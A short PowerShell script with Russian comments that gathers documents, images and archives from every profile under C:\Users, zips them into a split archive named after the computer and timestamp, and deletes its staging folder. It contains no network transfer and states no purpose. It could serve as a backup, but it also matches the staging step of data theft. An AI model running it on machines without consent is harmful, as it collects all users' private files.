$root = "C:\Users"
$destRoot = "C:\Papka"
$logsDir = "C:\logs"

# Расширения файлов для копирования
$ext = @(
    "doc","docx","xls","xlsx","ppt","pptx",
    "pdf","txt","rtf","odt","ods","odp","csv",
    "jpg","jpeg","png","gif","tif","tiff","bmp",
    "zip","rar","7z"
)

# Создание папки для файлов
New-Item -ItemType Directory -Path $destRoot -Force | Out-Null

# Получение всех файлов с указанными расширениями
$items = Get-ChildItem -Path $root -File -Recurse -ErrorAction SilentlyContinue |
    Where-Object { $ext -contains $_.Extension.TrimStart('.').ToLowerInvariant() }

$copied = 0
foreach ($item in $items) {
    try {
        $rel = $item.FullName.Substring($root.TrimEnd('\').Length).TrimStart('\')
        $target = Join-Path $destRoot $rel

        New-Item -ItemType Directory -Path (Split-Path $target -Parent) -Force | Out-Null
        Copy-Item -LiteralPath $item.FullName -Destination $target -Force -ErrorAction Stop
        $copied++
    } catch {
        continue
    }
}

"Copied: $copied files to $destRoot"

# Проверка наличия 7-Zip
$zipPath = "C:\Program Files\7-Zip\7z.exe"
$use7Zip = Test-Path $zipPath

# Имя компьютера, дата и время для имени архива
$computerName = $env:COMPUTERNAME
$dateTime = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$archiveName = "$computerName-$dateTime.zip"
$archivePath = Join-Path $logsDir $archiveName

# Создание папки для логов, если её нет
New-Item -ItemType Directory -Path $logsDir -Force | Out-Null

# Архивирование файлов
if ($use7Zip) {
    & "$zipPath" a -tzip $archivePath "$destRoot\*" -v2g
} else {
    [System.IO.Compression.ZipFile]::CreateFromDirectory($destRoot, $archivePath)
}

# Удаление временной папки
Remove-Item -Path $destRoot -Recurse -Force -ErrorAction SilentlyContinue

"Archived files to: $archivePath"
